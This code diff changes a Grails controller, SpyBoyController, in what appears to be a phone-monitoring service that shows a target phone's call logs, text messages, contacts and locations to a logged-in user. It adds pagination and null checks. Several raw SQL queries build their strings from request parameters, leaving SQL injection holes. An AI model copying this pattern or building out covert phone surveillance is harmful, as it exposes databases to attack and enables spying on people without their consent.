@@ -29,7 +29,7 @@ class SpyBoyController {
 
 		TargetPhone currentTargetPhone = getTargetPhone(params);
 
-		if(params.number!=null){
+		if(!"*all".equals(params.number)){
 			switch(params.iSortCol_0){
 				case "0":colSortName="phoneNumber";break;
 				case "1":colSortName="type";break;
@@ -59,7 +59,7 @@ class SpyBoyController {
 			totalSize = allCallLogs!=null ? allCallLogs.size():0;
 		}else{
 			def callLogsCriteria = CallLog.createCriteria();
-			callLogs = callLogsCriteria.list{
+			callLogs = callLogsCriteria.list(cache: true,offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)){
 				and {
 					targetPhone{
 						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
@@ -68,7 +68,17 @@ class SpyBoyController {
 				order("timeSeconds","desc")
 			}
 
-			totalSize = callLogs!=null ? callLogs.size():0;
+			def allCallLogsCriteria = CallLog.createCriteria();
+			def allCallLogs = allCallLogsCriteria.list{
+				and {
+					targetPhone{
+						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
+					}
+				}
+			}
+
+
+			totalSize = allCallLogs!=null ? allCallLogs.size():0;
 		}
 		render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,callLogInstanceList:callLogs]}
 	}
@@ -109,7 +119,7 @@ class SpyBoyController {
 		TargetPhone currentTargetPhone = getTargetPhone(params);
 
 		if(params.renderType!="table"){
-			if(number!=null){
+			if(!"*all".equals(params.number)){
 				def smsCriteria = Sms.createCriteria()
 				results = smsCriteria.list{
 					and {
@@ -133,12 +143,12 @@ class SpyBoyController {
 			}else{
 				isAll = true;
 				def session = sessionFactory.currentSession
-				def query = session.createSQLQuery("select * from Sms t1 left join Contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t2.id="+params.contactId+" t2.targetPhoneId='"+ currentTargetPhone.simSubscriberId +"' group by t1.time order by t1.time asc");
+				def query = session.createSQLQuery("select * from sms t1 left join contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t1.target_phone_id='"+ currentTargetPhone.simSubscriberId +"' group by t1.time order by t1.time asc");
 				query.addEntity(com.xaviar.domain.Sms.class);
 				query.addEntity(com.xaviar.domain.Contact.class); // this defines the result type of the query
 				results=query.list();
 			}
-			render(template:"sms",model:[isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact.get(0),smsInstanceList: results, smsInstanceTotal: results!=null ? results.size():0]);
+			render(template:"sms",model:[isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact!=null ? contact.get(0):null,smsInstanceList: results, smsInstanceTotal: results!=null ? results.size():0]);
 		}else{
 			colSortName="time";
 			switch(params.iSortCol_0){
@@ -146,7 +156,7 @@ class SpyBoyController {
 				case "1":colSortName="msg";break;
 				case "2":colSortName="time";break;
 			}
-			if(number!=null){
+			if(!"*all".equals(params.number)){
 				def smsCriteria = Sms.createCriteria();
 				results = smsCriteria.list (offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)) {
 					and {
@@ -174,7 +184,7 @@ class SpyBoyController {
 				def contactCriteria = Contact.createCriteria()
 				contact = contactCriteria.list{
 					and {
-						eq("id",Long.parseLong(params.contactId))
+						//eq("id",Long.parseLong(params.contactId))
 						targetPhone{
 							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
 						}
@@ -183,12 +193,12 @@ class SpyBoyController {
 			}else{
 				isAll = true;
 				def session = sessionFactory.currentSession
-				def query = session.createSQLQuery("select * from Sms t1 left join Contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t2.id="+params.contactId+" t2.targetPhoneId='"+ params.simSubscriberId +"' group by t1.time order by t1.time asc LIMIT " + params.iDisplayStart + ", "+ params.iDisplayLength);
+				def query = session.createSQLQuery("select * from Sms t1 left join Contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t1.target_phone_id='"+ params.simSubscriberId +"' group by t1.time order by t1.time asc LIMIT " + params.iDisplayStart + ", "+ params.iDisplayLength);
 				query.addEntity(com.xaviar.domain.Sms.class);// this defines the result type of the query
 				query.addEntity(com.xaviar.domain.Contact.class); // this defines the result type of the query
-				query.results=query.list();
+				results=query.list();
 			}
-			render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact.get(0),smsInstanceList: results, smsInstanceTotal:totalSize]};
+			render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact!=null ? contact.get(0):null,smsInstanceList: results, smsInstanceTotal:totalSize]};
 		}
 		return
 	}
@@ -277,8 +287,6 @@ class SpyBoyController {
 		def username  = SecurityUtils.subject?.principal
 		User currentUser = User.findByUsername(username);
 
-		//def targetPhones = user.targetPhones;
-
 		def targetPhoneCriteria = TargetPhone.createCriteria()
 		def targetPhones = targetPhoneCriteria.list{
 			and {
@@ -290,10 +298,9 @@ class SpyBoyController {
 		}
 
 		TargetPhone currentTargetPhone = null;
-		
+		List<String> subscribersList = new ArrayList<String>();
+
 		if(targetPhones!=null && !targetPhones.isEmpty()){
-
-
 			if(simSubscriberId!=null && !simSubscriberId.isEmpty()){
 				if(!validateSimID(simSubscriberId,targetPhones)){
 					log.info "invalue target phone for this user."
@@ -320,31 +327,35 @@ class SpyBoyController {
 
 			if(contacts!=null && contacts.size()>0){
 				Contact defaultContact = contacts.get(0);
-				String defaultNumber = defaultContact.number;
+				String defaultNumber = null;//defaultContact.number;
 
-				//call logs
-				def callLogCriteria = CallLog.createCriteria()
-				callLogs = callLogCriteria.list(offset:0,max:5) {
-					and {
-						eq("phoneNumber", defaultNumber)
-						targetPhone{
-							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
-						}
-					}
-					order("timeSeconds","desc")
-				}
-
-				//smses
-				def smsCriteria = Sms.createCriteria()
-				smss = smsCriteria.list(offset:0,max:5) {
-					and {
-						eq("address", defaultNumber)
-						targetPhone{
-							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
-						}
-					}
-					order("time","desc")
-				}
+				//			//call logs
+				//			def callLogCriteria = CallLog.createCriteria()
+				//			callLogs = callLogCriteria.list(offset:0,max:5) {
+				//				and {
+				//					if(defaultNumber!=null){
+				//						eq("phoneNumber", defaultNumber)
+				//					}
+				//					targetPhone{
+				//						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
+				//					}
+				//				}
+				//				order("timeSeconds","desc")
+				//			}
+				//
+				//			//smses
+				//			def smsCriteria = Sms.createCriteria()
+				//			smss = smsCriteria.list(offset:0,max:5) {
+				//				and {
+				//					if(defaultNumber!=null){
+				//						eq("address", defaultNumber)
+				//					}
+				//					targetPhone{
+				//						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
+				//					}
+				//				}
+				//				order("time","desc")
+				//			}
 
 				// locations
 				def locationCriteria = Location.createCriteria()
@@ -358,7 +369,16 @@ class SpyBoyController {
 				}
 			}
 		}
-		[currentTargetPhone:currentTargetPhone,activeSimSubscriberId:simSubscriberId,targetPhoneInstanceList:targetPhones,user:currentUser,scrollToID:scrollTo,contactInstanceList: contacts,contactInstanceTotal: contacts!=null ? contacts.size():0,smsInstanceTotal: smss!=null ? smss.size():0,callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,locationInstanceList:locations as JSON,locationInstanceTotal: locations!=null ? locations.size():0]
+		[currentTargetPhone:currentTargetPhone,
+			activeSimSubscriberId:simSubscriberId,
+			targetPhoneInstanceList:targetPhones,
+			user:currentUser,
+			scrollToID:scrollTo,
+			contactInstanceList: contacts,
+			contactInstanceTotal: contacts!=null ? contacts.size():0,
+			//smsInstanceTotal: smss!=null ? smss.size():0,
+			//callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,
+			locationInstanceList:locations as JSON,locationInstanceTotal: locations!=null ? locations.size():0]
 	}
 
 
